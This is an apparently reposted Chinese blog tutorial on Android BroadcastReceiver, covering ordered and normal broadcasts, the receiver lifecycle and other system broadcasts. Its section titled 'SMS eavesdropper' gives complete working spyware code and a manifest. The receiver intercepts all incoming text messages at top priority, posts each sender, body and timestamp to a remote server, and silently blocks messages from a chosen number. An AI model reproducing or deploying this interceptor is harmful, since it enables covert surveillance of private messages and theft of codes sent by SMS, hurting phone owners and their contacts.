@@ -1,0 +1,373 @@
+广播接收者 -- BroadcastReceiver
+
+ 
+
+1. 概述
+
+       广播被分为两种不同的类型：“普通广播（Normal broadcasts）”和“有序广播（Ordered broadcasts）”。
+
+       普通广播是完全异步的，可以在同一时刻（逻辑上）被所有接收者接收到，消息传递的效率比较高，
+
+     但缺点是：接收者不能将处理结果传递给下一个接收者，并且无法终止广播Intent的传播。
+
+     
+
+       然而有序广播是按照接收者声明的优先级别，被接收者依次接收广播。如：A的级别高于B,B的级别高于C,那么，广播先传给A，再传给B，最后传给C 。
+
+           优先级别声明在 intent-filter 元素的 android:priority 属性中，数越大优先级别越高,取值范围:-1000到1000，优先级别也可以调用IntentFilter对象的setPriority()进行设置 。
+
+       有序广播的接收者可以终止广播Intent的传播，广播Intent的传播一旦终止，后面的接收者就无法接收到广播。
+
+       另外，有序广播的接收者可以将数据传递给下一个接收者，如：A得到广播后，可以往它的结果对象中存入数据，当广播传给B时,B可以从A的结果对象中得到A存入的数据。
+
+       
+
+       Context.sendBroadcast()
+
+     发送的是普通广播，所有订阅者都有机会获得并进行处理。
+
+ 
+
+       Context.sendOrderedBroadcast()
+
+     发送的是有序广播，系统会根据接收者声明的优先级别按顺序逐个执行接收者，
+
+     前面的接收者有权终止广播(BroadcastReceiver.abortBroadcast())，如果广播被前面的接收者终止，
+
+     后面的接收者就再也无法获取到广播。
+
+     对于有序广播，前面的接收者可以将数据通过setResultExtras(Bundle)方法存放进结果对象，
+
+     然后传给下一个接收者，下一个接收者通过代码：Bundle bundle = getResultExtras(true))可以获取上一个接收者存入在结果对象中的数据。
+
+ 
+
+2.
+
+       广播接收者（BroadcastReceiver）用于接收广播 Intent，广播 Intent 的发送是通过调用 Context.sendBroadcast()、Context.sendOrderedBroadcast() 来实现的。
+
+       
+
+       通常一个广播 Intent 可以被订阅了此 Intent 的多个广播接收者所接收，这个特性跟 JMS 中的 Topic 消息接收者类似。
+
+       要实现一个广播接收者方法如下：
+
+              第一步：继承BroadcastReceiver，并重写onReceive()方法。
+
+              public class IncomingSMSReceiver extends BroadcastReceiver {
+
+                     @Override public void onReceive(Context context, Intent intent) {
+
+                     }
+
+              }
+
+              第二步：订阅感兴趣的广播Intent，订阅方法有两种：
+
+                     第一种：使用代码进行订阅
+
+                            <!-- android.provider.Telephony.SMS_RECEIVED 是短信广播-- >
+
+                            IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
+
+                            IncomingSMSReceiver receiver = new IncomingSMSReceiver();
+
+                            registerReceiver(receiver, filter);
+
+                     第二种：在AndroidManifest.xml文件中的<application>节点里进行订阅:
+
+                            <receiver android:name=".IncomingSMSReceiver">
+
+                                <intent-filter>
+
+                                     <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+
+                                </intent-filter>
+
+                            </receiver>
+
+3.
+
+       在Android中，每次广播消息到来时都会创建BroadcastReceiver实例并执行onReceive() 方法， 
+
+       onReceive() 方法执行完后，BroadcastReceiver 的实例就会被销毁。
+
+       当onReceive() 方法在10秒内没有执行完毕，Android会认为该程序无响应。
+
+       所以在BroadcastReceiver里不能做一些比较耗时的操作，否侧会弹出ANR（Application No Response）的对话框。
+
+       如果需要完成一项比较耗时的工作，应该通过发送Intent给Service，由Service来完成。
+
+       这里不能使用子线程来解决，因为 BroadcastReceiver 的生命周期很短，子线程可能还没有结束BroadcastReceiver就先结束了。
+
+       BroadcastReceiver一旦结束，此时BroadcastReceiver所在的进程很容易在系统需要内存时被优先杀死，
+
+       因为它属于空进程（没有任何活动组件的进程）。
+
+       如果它的宿主进程被杀死，那么正在工作的子线程也会被杀死。所以采用子线程来解决是不可靠的。
+
+ 
+
+ 
+
+4. 实现短信窃听器
+
+       * 当短信到来的时候，会发出一个短信到来广播。只要订阅这个广播。就能获取到短信的所有信息。
+
+       
+
+       * 系统收到短信，发出的广播属于有序广播。
+
+         如果想阻止用户收到短信，可以通过设置优先级，让你们自定义的接收者先获取到广播，然后终止广播，这样用户就接收不到短信了。
+
+         
+
+       * 新建 Android 项目 ： SMSListener
+
+       
+
+       * 在 AndroidManifest.xml 添加相应权限
+
+              <!-- 接收短信权限 -->
+
+              <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+
+                <!-- 访问internet权限 -->
+
+              <uses-permission android:name="android.permission.INTERNET"/>
+
+       * 新建广播接收者类：IncomingSMSReceiver
+
+              view plaincopy to clipboardprint?
+/**  
+ * 短信窃听器  
+ */  
+public class IncomingSMSReceiver extends BroadcastReceiver {   
+    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";   
+    @Override  
+    public void onReceive(Context context, Intent intent) {   
+        String action = intent.getAction();   
+        if(SMS_RECEIVED.equals(action)) {   
+            Bundle bundle = intent.getExtras();   
+            if(bundle != null) {   
+                Object[] pdus = (Object[]) bundle.get("pdus");   
+                   
+                for(Object pdu : pdus) {   
+                    /* 要特别注意，这里是android.telephony.SmsMessage 可不是  android.telephony.SmsManager  */  
+                    SmsMessage message = SmsMessage.createFromPdu((byte[])pdu);   
+                    String sender = message.getOriginatingAddress();   
+                    String conetnt = message.getMessageBody();   
+                    Date date = new Date(message.getTimestampMillis());   
+                    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");   
+                    String time = dateFormat.format(date);   
+                    sendSMS(sender, conetnt, time);   
+                       
+                    /* 实现黑名单功能，下面这段代码将  5556 发送者的短信屏蔽  
+                     * 前提是，本接受者的优先权要高于 Android 内置的短信应用程序 */  
+                    if("5556".equals(sender)){    
+                        abortBroadcast();   
+                    }   
+                        }   
+                    }   
+        }   
+    }   
+       
+    /**  
+     * 发送拦截的短信到服务器   
+     */  
+    private void sendSMS(String sender, String conetnt, String time) {   
+        try {   
+            /* HTTP 协议的实体数据 */  
+                        byte[] entity = getEntity(sender, conetnt, time);   
+               
+                        /* 发送的目标地址 */  
+            URL url = new URL("http://192.168.1.102:8080/myvideoweb/ems.do");   
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();   
+               
+            conn.setConnectTimeout(5*1000);   
+            conn.setRequestMethod("POST");   
+               
+            //必须设置此属性为 true   
+            conn.setDoOutput(true);   
+               
+            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");   
+            conn.setRequestProperty("Content-Length", String.valueOf(entity.length));   
+               
+            OutputStream os = conn.getOutputStream();   
+            os.write(entity);   
+               
+            /* 在此方法之前 conn 的数据都是被缓存起来的，并没有真正发送 。因此必须要调用这个方法一下。 */  
+            conn.getResponseCode();   
+               
+            os.close();   
+               
+        } catch (Exception e) {   
+        }   
+    }   
+    private byte[] getEntity(String sender, String conetnt, String time) throws Exception {   
+        String params = "method=getSMS&sender="+ sender+"&content="+   
+            URLEncoder.encode(conetnt, "UTF-8")+ "&time="+ time;   
+        return params.getBytes();   
+    }   
+}  
+/**
+ * 短信窃听器
+ */
+public class IncomingSMSReceiver extends BroadcastReceiver {
+	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
+	@Override
+	public void onReceive(Context context, Intent intent) {
+		String action = intent.getAction();
+		if(SMS_RECEIVED.equals(action)) {
+			Bundle bundle = intent.getExtras();
+			if(bundle != null) {
+				Object[] pdus = (Object[]) bundle.get("pdus");
+				
+				for(Object pdu : pdus) {
+					/* 要特别注意，这里是android.telephony.SmsMessage 可不是  android.telephony.SmsManager  */
+					SmsMessage message = SmsMessage.createFromPdu((byte[])pdu);
+					String sender = message.getOriginatingAddress();
+					String conetnt = message.getMessageBody();
+					Date date = new Date(message.getTimestampMillis());
+					SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+					String time = dateFormat.format(date);
+					sendSMS(sender, conetnt, time);
+					
+					/* 实现黑名单功能，下面这段代码将  5556 发送者的短信屏蔽
+					 * 前提是，本接受者的优先权要高于 Android 内置的短信应用程序 */
+					if("5556".equals(sender)){ 
+						abortBroadcast();
+					}
+						}
+					}
+		}
+	}
+	
+	/**
+	 * 发送拦截的短信到服务器 
+	 */
+	private void sendSMS(String sender, String conetnt, String time) {
+		try {
+			/* HTTP 协议的实体数据 */
+                        byte[] entity = getEntity(sender, conetnt, time);
+			
+                        /* 发送的目标地址 */
+			URL url = new URL("http://192.168.1.102:8080/myvideoweb/ems.do");
+			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+			
+			conn.setConnectTimeout(5*1000);
+			conn.setRequestMethod("POST");
+			
+			//必须设置此属性为 true
+			conn.setDoOutput(true);
+			
+			conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+			conn.setRequestProperty("Content-Length", String.valueOf(entity.length));
+			
+			OutputStream os = conn.getOutputStream();
+			os.write(entity);
+			
+			/* 在此方法之前 conn 的数据都是被缓存起来的，并没有真正发送 。因此必须要调用这个方法一下。 */
+			conn.getResponseCode();
+			
+			os.close();
+			
+		} catch (Exception e) {
+		}
+	}
+	private byte[] getEntity(String sender, String conetnt, String time) throws Exception {
+		String params = "method=getSMS&sender="+ sender+"&content="+
+			URLEncoder.encode(conetnt, "UTF-8")+ "&time="+ time;
+		return params.getBytes();
+	}
+}
+ 
+
+ 
+
+              AndroidManifest.xml 的代码清单
+
+              view plaincopy to clipboardprint?
+<?xml version="1.0" encoding="utf-8"?>  
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"  
+      package="wjh.android.sms"  
+      android:versionCode="1"  
+      android:versionName="1.0">  
+    <application android:icon="@drawable/icon" android:label="@string/app_name">  
+        <receiver android:name=".IncomingSMSReceiver">  
+            <!-- android:priority="1000" 设置了广播接收优先权，最大为 1000  -->  
+            <intent-filter android:priority="1000">  
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />  
+            </intent-filter>  
+        </receiver>  
+    </application>  
+    <uses-sdk android:minSdkVersion="8" />  
+    <!-- 接收短信权限 -->  
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>  
+    <!-- 连接网络的权限 -->  
+    <uses-permission android:name="android.permission.INTERNET"/>  
+</manifest>  
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+      package="wjh.android.sms"
+      android:versionCode="1"
+      android:versionName="1.0">
+    <application android:icon="@drawable/icon" android:label="@string/app_name">
+		<receiver android:name=".IncomingSMSReceiver">
+			<!-- android:priority="1000" 设置了广播接收优先权，最大为 1000  -->
+			<intent-filter android:priority="1000">
+				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
+			</intent-filter>
+		</receiver>
+    </application>
+    <uses-sdk android:minSdkVersion="8" />
+    <!-- 接收短信权限 -->
+	<uses-permission android:name="android.permission.RECEIVE_SMS"/>
+	<!-- 连接网络的权限 -->
+	<uses-permission android:name="android.permission.INTERNET"/>
+</manifest>
+ 
+
+ 
+
+ 
+
+4. 其它广播Intent
+
+       除了短信到来广播Intent，Android还有很多广播Intent，如：开机启动、电池电量变化、时间已经改变等广播Intent。
+
+        
+
+        ** 接收电池电量变化广播Intent ，在AndroidManifest.xml文件中的<application>节点里订阅此Intent:
+
+              <receiver android:name=".IncomingSMSReceiver">
+
+                  <intent-filter>
+
+                       <action android:name="android.intent.action.BATTERY_CHANGED"/>
+
+                  </intent-filter>
+
+              </receiver>
+
+       
+
+        ** 接收开机启动广播Intent，在AndroidManifest.xml文件中的<application>节点里订阅此Intent:
+
+              <receiver android:name=".IncomingSMSReceiver">
+
+                  <intent-filter>
+
+                       <action android:name="android.intent.action.BOOT_COMPLETED"/>
+
+                  </intent-filter>
+
+              </receiver>
+
+              并且要进行权限声明：
+
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+
+
+
+本文来自CSDN博客，转载请标明出处：http://blog.csdn.net/wenlin56/archive/2010/12/16/6080946.aspx
